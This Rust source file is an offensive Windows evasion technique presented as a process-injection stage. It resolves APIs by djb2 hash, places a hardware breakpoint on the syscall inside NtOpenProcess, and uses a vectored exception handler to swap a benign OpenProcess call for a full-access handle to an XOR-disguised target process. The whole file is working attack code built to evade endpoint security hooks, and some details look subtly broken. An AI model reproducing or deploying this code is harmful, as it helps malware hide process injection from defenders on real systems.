use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::Threading::*;
use std::ptr;

// Define XOR key for encrypting the target PID
const XOR_KEY: u32 = 0x12345678; // Example key

// Define the state for the exception handler
#[repr(C)]
struct InjectionState {
    syscall_address: *const c_void,           // Address of the syscall instruction
    process_handle: *mut HANDLE,              // Pointer to store the process handle
    desired_access: u32,                      // Desired access rights
    object_attributes: *mut OBJECT_ATTRIBUTES,// Object attributes for NtOpenProcess
    client_id: *mut CLIENT_ID,                // Client ID (target PID, encrypted)
}

// Initialize static state (unsafe due to mutability)
static mut INJECTION_STATE: InjectionState = InjectionState {
    syscall_address: ptr::null(),
    process_handle: ptr::null_mut(),
    desired_access: 0,
    object_attributes: ptr::null_mut(),
    client_id: ptr::null_mut(),
};

// Simple djb2 hash function for API hashing
fn djb2_hash(str: &str) -> u32 {
    let mut hash = 5381u32;
    for c in str.bytes() {
        hash = ((hash << 5) + hash) + c as u32;
    }
    hash
}

// Resolve API function by hash from a module
fn resolve_api(module: HMODULE, target_hash: u32) -> Option<*const c_void> {
    unsafe {
        let dos_header = module.0 as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != 0x5A4D {
            return None;
        }
        let nt_headers = (module.0 as *const u8).add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt_headers).Signature != 0x00004550 {
            return None;
        }
        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
        if export_dir_rva == 0 {
            return None;
        }
        let export_dir = (module.0 as *const u8).add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
        let names = (module.0 as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
        let functions = (module.0 as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let ordinals = (module.0 as *const u8).add((*export_dir).AddressOfNameOrdinals as usize) as *const u16;
        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_ptr = (module.0 as *const u8).add(name_rva as usize) as *const i8;
            let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
            let hash = djb2_hash(name);
            if hash == target_hash {
                let ordinal = *ordinals.add(i as usize);
                let func_rva = *functions.add(ordinal as usize);
                let func_ptr = (module.0 as *const u8).add(func_rva as usize) as *const c_void;
                return Some(func_ptr);
            }
        }
        None
    }
}

// Find the syscall instruction (0x0F05) in the function code
fn find_syscall_instruction(func_ptr: *const u8) -> *const c_void {
    let mut ptr = func_ptr;
    unsafe {
        while *ptr != 0x0F || *ptr.add(1) != 0x05 {
            ptr = ptr.add(1);
        }
        ptr as *const c_void
    }
}

// Exception handler for hardware breakpoints
extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let exception_record = (*exception_info).ExceptionRecord;
        let context = (*exception_info).ContextRecord;

        if (*exception_record).ExceptionCode == EXCEPTION_SINGLE_STEP.0 as u32
            && (*exception_record).ExceptionAddress == INJECTION_STATE.syscall_address
        {
            // Decrypt the target PID
            let client_id_ptr = INJECTION_STATE.client_id;
            let encrypted_pid = (*client_id_ptr).UniqueProcess.0 as u32;
            let target_pid = encrypted_pid ^ XOR_KEY;
            (*client_id_ptr).UniqueProcess = HANDLE(target_pid as isize);

            // Set registers for NtOpenProcess with decrypted parameters
            (*context).Rcx = INJECTION_STATE.process_handle as u64;
            (*context).Rdx = INJECTION_STATE.desired_access as u64;
            (*context).R8 = INJECTION_STATE.object_attributes as u64;
            (*context).R9 = client_id_ptr as u64;

            // Disable the breakpoint
            (*context).Dr7 = 0;
            return EXCEPTION_CONTINUE_EXECUTION.0 as i32;
        }
    }
    EXCEPTION_CONTINUE_SEARCH.0 as i32
}

fn main() {
    unsafe {
        // Load kernel32.dll
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
        if kernel32.is_invalid() {
            panic!("Failed to load kernel32.dll");
        }

        // Resolve AddVectoredExceptionHandler using hash
        let add_veh_hash = djb2_hash("AddVectoredExceptionHandler");
        let add_veh = resolve_api(kernel32, add_veh_hash).expect("Failed to resolve AddVectoredExceptionHandler");
        let add_veh_fn = std::mem::transmute::<*const c_void, fn(u32, PVOID) -> PVOID>(add_veh);
        let handler = add_veh_fn(1, Some(exception_handler));

        // Load ntdll.dll
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_invalid() {
            panic!("Failed to load ntdll.dll");
        }

        // Get NtOpenProcess address
        let nt_open_process = GetProcAddress(ntdll, b"NtOpenProcess\0".as_ptr() as *const i8);
        if nt_open_process.is_null() {
            panic!("Failed to get NtOpenProcess address");
        }

        // Find the syscall instruction dynamically
        let syscall_address = find_syscall_instruction(nt_open_process as *const u8);
        if syscall_address.is_null() {
            panic!("Failed to find syscall instruction");
        }

        // Set up injection parameters
        let mut process_handle: HANDLE = HANDLE::default();
        let desired_access = PROCESS_ALL_ACCESS.0;
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            ..Default::default()
        };
        // Encrypt the target PID
        let target_pid: u32 = 1234; // Replace with actual target PID
        let encrypted_pid = target_pid ^ XOR_KEY;
        let mut client_id = CLIENT_ID {
            UniqueProcess: HANDLE(encrypted_pid as isize),
            UniqueThread: HANDLE::default(),
        };

        // Update INJECTION_STATE
        INJECTION_STATE = InjectionState {
            syscall_address,
            process_handle: &mut process_handle,
            desired_access,
            object_attributes: &mut object_attributes,
            client_id: &mut client_id,
        };

        // Get current thread handle
        let thread = GetCurrentThread();
        if thread.is_invalid() {
            panic!("Failed to get current thread handle");
        }

        // Get thread context
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS.0;
        if !GetThreadContext(thread, &mut context).as_bool() {
            panic!("Failed to get thread context");
        }

        // Set hardware breakpoint on syscall instruction
        context.Dr0 = syscall_address as u64;
        context.Dr7 = (context.Dr7 & !0x000F0003) | 0x00000001; // Enable execute breakpoint on DR0

        // Resolve SetThreadContext using hash
        let set_thread_context_hash = djb2_hash("SetThreadContext");
        let set_thread_context = resolve_api(kernel32, set_thread_context_hash).expect("Failed to resolve SetThreadContext");
        let set_thread_context_fn = std::mem::transmute::<*const c_void, fn(HANDLE, *const CONTEXT) -> BOOL>(set_thread_context);
        if !set_thread_context_fn(thread, &context).as_bool() {
            panic!("Failed to set thread context");
        }

        // Call OpenProcess with benign parameters
        let benign_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION,
            FALSE,
            GetCurrentProcessId(),
        );
        if benign_handle.is_invalid() {
            println!("OpenProcess returned invalid handle (expected due to parameter modification)");
        }

        // The exception handler should have modified parameters, so process_handle
        // now contains the handle to the target process (if successful)
        if !process_handle.is_invalid() {
            println!("Successfully obtained process handle: {:?}", process_handle);
            // Proceed with further injection steps using process_handle...
            CloseHandle(process_handle);
        } else {
            println!("Failed to obtain process handle");
        }

        // Remove the VEH immediately after use
        let remove_veh_hash = djb2_hash("RemoveVectoredExceptionHandler");
        let remove_veh = resolve_api(kernel32, remove_veh_hash).expect("Failed to resolve RemoveVectoredExceptionHandler");
        let remove_veh_fn = std::mem::transmute::<*const c_void, fn(PVOID) -> ULONG>(remove_veh);
        remove_veh_fn(handler);

        // Clean up
        FreeLibrary(ntdll);
    }
}